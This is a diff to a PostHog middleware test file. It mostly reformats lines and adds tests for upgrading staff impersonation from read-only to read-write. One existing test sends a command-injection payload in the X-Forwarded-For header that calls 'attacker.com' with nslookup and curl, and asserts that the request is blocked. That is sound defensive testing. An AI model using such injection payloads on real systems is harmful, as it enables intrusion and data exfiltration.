@@ -1,3 +1,4 @@
+import json
 from datetime import datetime, timedelta
 
 from freezegun import freeze_time
@@ -72,7 +73,9 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                 response = self.client.get(
-                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"}
+                    "/",
+                    REMOTE_ADDR="10.0.0.1",
+                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
                 self.assertNotIn(b"PostHog is not available", response.content)
 
@@ -83,7 +86,9 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                 response = self.client.get(
-                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"}
+                    "/",
+                    REMOTE_ADDR="10.0.0.1",
+                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"},
                 )
                 self.assertEqual(response.status_code, 403)
                 self.assertIn(b"PostHog is not available", response.content)
@@ -95,7 +100,9 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             with self.settings(TRUST_ALL_PROXIES=True):
                 response = self.client.get(
-                    "/", REMOTE_ADDR="10.0.0.1", headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"}
+                    "/",
+                    REMOTE_ADDR="10.0.0.1",
+                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
                 self.assertNotIn(b"PostHog is not available", response.content)
 
@@ -126,7 +133,11 @@ class TestAccessMiddleware(APIBaseTest):
 
     def test_ip_with_port_stripped(self):
         """IP addresses with ports should have the port stripped before validation."""
-        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/24"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+        with self.settings(
+            ALLOWED_IP_BLOCKS=["192.168.0.0/24"],
+            USE_X_FORWARDED_HOST=True,
+            TRUST_ALL_PROXIES=True,
+        ):
             # IPv4 with port
             response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
             self.assertNotIn(b"PostHog is not available", response.content)
@@ -138,10 +149,15 @@ class TestAccessMiddleware(APIBaseTest):
 
     def test_malformed_ip_blocked(self):
         """Malformed IPs and attack payloads should be blocked (fail closed)."""
-        with self.settings(ALLOWED_IP_BLOCKS=["0.0.0.0/0"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+        with self.settings(
+            ALLOWED_IP_BLOCKS=["0.0.0.0/0"],
+            USE_X_FORWARDED_HOST=True,
+            TRUST_ALL_PROXIES=True,
+        ):
             # Attack payload in XFF header
             response = self.client.get(
-                "/", headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"}
+                "/",
+                headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"},
             )
             self.assertIn(b"PostHog is not available", response.content)
 
@@ -201,7 +217,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
         self.assertEqual(response_dashboards_api.status_code, 200)
 
-    def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(self):
+    def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(
+        self,
+    ):
         dashboard = Dashboard.objects.create(team=self.second_team)
 
         response_app = self.client.get(f"/dashboard/{dashboard.id}/")
@@ -215,7 +233,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
         self.assertEqual(response_dashboards_api.status_code, 200)
 
-    def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(self):
+    def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(
+        self,
+    ):
         _, _, third_team = Organization.objects.bootstrap(
             None,
             name="Third Party",
@@ -261,7 +281,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
         self.assertEqual(response_insights_api.status_code, 200)
 
-    def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(self):
+    def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(
+        self,
+    ):
         insight = Insight.objects.create(team=self.second_team)
 
         response_app = self.client.get(f"/insights/{insight.short_id}/edit")
@@ -304,7 +326,9 @@ class TestAutoProjectMiddleware(APIBaseTest):
         self.assertEqual(response_cohorts_api.status_code, 200)
 
     @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
-    def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(self):
+    def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(
+        self,
+    ):
         feature_flag = FeatureFlag.objects.create(team=self.second_team, created_by=self.user)
 
         with self.assertNumQueries(self.base_app_num_queries + 7):  # +1 from activity logging _get_before_update()
@@ -379,12 +403,16 @@ class TestAutoProjectMiddleware(APIBaseTest):
             == f"/project/{self.third_team.pk}/replay/018f5c3e-1a17-7f2b-ac83-32d06be3269b?t=2601"
         )
 
-    def test_project_redirects_to_current_team_when_accessing_missing_project_by_token(self):
+    def test_project_redirects_to_current_team_when_accessing_missing_project_by_token(
+        self,
+    ):
         res = self.client.get(f"/project/phc_123/home")
         assert res.status_code == 302
         assert res.headers["Location"] == f"/project/{self.team.pk}/home"
 
-    def test_project_redirects_to_current_team_when_accessing_inaccessible_project_by_token(self):
+    def test_project_redirects_to_current_team_when_accessing_inaccessible_project_by_token(
+        self,
+    ):
         res = self.client.get(f"/project/{self.no_access_team.api_token}/home")
         assert res.status_code == 302
         assert res.headers["Location"] == f"/project/{self.team.pk}/home"
@@ -815,13 +843,18 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
 
         assert response.status_code == 200
 
-    def test_read_only_impersonation_blocks_set_current_organization_with_other_fields(self):
+    def test_read_only_impersonation_blocks_set_current_organization_with_other_fields(
+        self,
+    ):
         """Verify read-only impersonation blocks PATCH with set_current_organization plus other fields."""
         self.login_as_other_user_read_only()
 
         response = self.client.patch(
             "/api/users/@me/",
-            data={"set_current_organization": str(self.organization.id), "first_name": "Hacked"},
+            data={
+                "set_current_organization": str(self.organization.id),
+                "first_name": "Hacked",
+            },
             content_type="application/json",
         )
 
@@ -915,7 +948,10 @@ class TestImpersonationBlockedPathsMiddleware(APIBaseTest):
 
         response = self.client.patch(
             "/api/users/@me/",
-            data={"set_current_organization": str(self.organization.id), "first_name": "Hacked"},
+            data={
+                "set_current_organization": str(self.organization.id),
+                "first_name": "Hacked",
+            },
             content_type="application/json",
         )
 
@@ -1013,6 +1049,121 @@ class TestImpersonationLoginReasonRequired(APIBaseTest):
         assert self.client.get("/api/users/@me/").json()["email"] == self.user.email
 
 
+class TestUpgradeImpersonation(APIBaseTest):
+    other_user: User
+
+    def setUp(self):
+        super().setUp()
+        self.other_user = User.objects.create_and_join(
+            self.organization, email="other-user@posthog.com", password="123456"
+        )
+        self.user.is_staff = True
+        self.user.save()
+
+        self.client = DjangoClient()  # type: ignore[assignment]
+        self.client.force_login(self.user)
+
+    def login_as_read_only(self):
+        return self.client.post(
+            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
+            data={"read_only": "true", "reason": "Initial read-only impersonation"},
+            follow=True,
+        )
+
+    def login_as_read_write(self):
+        return self.client.post(
+            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
+            data={"read_only": "false", "reason": "Initial read-write impersonation"},
+            follow=True,
+        )
+
+    def test_upgrade_succeeds_from_read_only_with_reason(self):
+        self.login_as_read_only()
+
+        # Verify we're in read-only mode
+        user_response = self.client.get("/api/users/@me/")
+        assert user_response.json()["is_impersonated_read_only"] is True
+
+        # Upgrade to read-write
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "Need to make changes for support ticket #5678"}),
+            content_type="application/json",
+        )
+        assert response.status_code == 200
+        assert response.json()["success"] is True
+
+        # Verify we're now in read-write mode
+        user_response = self.client.get("/api/users/@me/")
+        assert user_response.json()["is_impersonated_read_only"] is False
+
+    def test_upgrade_returns_404_when_not_impersonated(self):
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "Some reason"}),
+            content_type="application/json",
+        )
+        assert response.status_code == 404
+
+    def test_upgrade_returns_404_when_already_read_write(self):
+        self.login_as_read_write()
+
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "Some reason"}),
+            content_type="application/json",
+        )
+        assert response.status_code == 404
+
+    def test_upgrade_returns_400_without_reason(self):
+        self.login_as_read_only()
+
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({}),
+            content_type="application/json",
+        )
+        assert response.status_code == 400
+        assert "reason" in response.json()["error"].lower()
+
+    def test_upgrade_returns_400_with_empty_reason(self):
+        self.login_as_read_only()
+
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "   "}),
+            content_type="application/json",
+        )
+        assert response.status_code == 400
+
+    @patch("ee.admin.loginas_views.get_original_user_from_session", return_value=None)
+    def test_upgrade_returns_400_when_staff_user_not_found(self, mock_get_staff):
+        self.login_as_read_only()
+
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "Some reason"}),
+            content_type="application/json",
+        )
+        assert response.status_code == 400
+        assert response.json()["error"] == "Unable to upgrade impersonation"
+
+    def test_upgrade_returns_400_when_staff_demoted_mid_session(self):
+        self.login_as_read_only()
+
+        # Revoke staff privileges mid-session
+        self.user.is_staff = False
+        self.user.save()
+
+        response = self.client.post(
+            reverse("impersonation-upgrade"),
+            data=json.dumps({"reason": "Some reason"}),
+            content_type="application/json",
+        )
+        assert response.status_code == 400
+        assert response.json()["error"] == "Unable to upgrade impersonation"
+
+
 @override_settings(SESSION_COOKIE_AGE=100)
 class TestSessionAgeMiddleware(APIBaseTest):
     def setUp(self):
@@ -1036,7 +1187,10 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Initial request sets session creation time
         response = self.client.get("/")
         self.assertEqual(response.status_code, 200)
-        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)
+        self.assertEqual(
+            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
+            1704110400.0,
+        )
 
         # Move forward 99 seconds (before timeout)
         mock_time.return_value = 1704110499.0  # 2024-01-01 12:01:39
@@ -1049,7 +1203,10 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Initial request sets session creation time
         response = self.client.get("/")
         self.assertEqual(response.status_code, 200)
-        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)
+        self.assertEqual(
+            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
+            1704110400.0,
+        )
 
         # Move forward past total session age (101 seconds)
         mock_time.return_value = 1704110501.0  # 2024-01-01 12:01:41
@@ -1057,7 +1214,8 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Should redirect to login
         self.assertEqual(response.status_code, 302)
         self.assertEqual(
-            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
+            response.headers["Location"],
+            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
         )
 
     @freeze_time("2024-01-01 12:00:00")
@@ -1069,7 +1227,10 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Initial request sets session creation time
         response = self.client.get("/")
         self.assertEqual(response.status_code, 200)
-        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)
+        self.assertEqual(
+            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
+            1704110400.0,
+        )
 
         # Move forward past org timeout (51 seconds)
         mock_time.return_value = 1704110451.0  # 2024-01-01 12:00:51
@@ -1077,7 +1238,8 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Should redirect to login
         self.assertEqual(response.status_code, 302)
         self.assertEqual(
-            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
+            response.headers["Location"],
+            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
         )
 
     @freeze_time("2024-01-01 12:00:00")
@@ -1095,7 +1257,10 @@ class TestSessionAgeMiddleware(APIBaseTest):
         # Initial request sets session creation time
         response = self.client.get("/")
         self.assertEqual(response.status_code, 200)
-        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)
+        self.assertEqual(
+            self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY),
+            1704110400.0,
+        )
 
         # Switch to other team
         self.user.team = other_team
@@ -1113,7 +1278,8 @@ class TestSessionAgeMiddleware(APIBaseTest):
         response = self.client.get("/")
         self.assertEqual(response.status_code, 302)
         self.assertEqual(
-            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
+            response.headers["Location"],
+            "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again.",
         )
 
 
